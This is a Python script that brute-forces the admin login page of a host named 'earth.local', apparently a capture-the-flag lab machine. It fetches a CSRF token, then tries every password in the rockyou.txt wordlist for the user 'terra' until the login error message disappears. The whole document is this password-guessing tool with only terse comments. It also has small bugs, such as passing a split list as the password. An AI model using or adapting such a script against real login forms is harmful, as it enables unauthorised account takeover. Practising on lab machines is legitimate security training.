import requests

# URL and credentials
base_url = 'http://earth.local/admin/login'

user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

## create function that perform login attempt on the server we use session to persist any cookies

def  perform_login_request(url, psvar: str):
    session = requests.Session()
    response = session.get(url)
    csrftoken = response.cookies.get('csrftoken')
    headers = {'Cookie': csrftoken}
    login_data = {'csrfmiddlewaretoken': csrftoken, 'username': "terra", 'password': psvar}
    response_p = session.post(base_url, data=login_data)
    return response_p
    
    

### print a green message on console this is usefull when printing successful results    
    
def print_green(text):
 
    green_color_code = "\033[92m"
    reset_color_code = "\033[0m"
    
    print(f"{green_color_code}{text}{reset_color_code}")   





error_string = "Please enter a correct username and password"

### the line must be splitter to remove the \n

with open('rockyou.txt', 'r') as file:
    for line in file:
        response_O=perform_login_request(base_url, line.split())
        print("not",line)
       # print(response_O.text)
        if error_string not in response_O.text:
            print_green("brute force was successful and the password is "+line)
            break
        
        
   

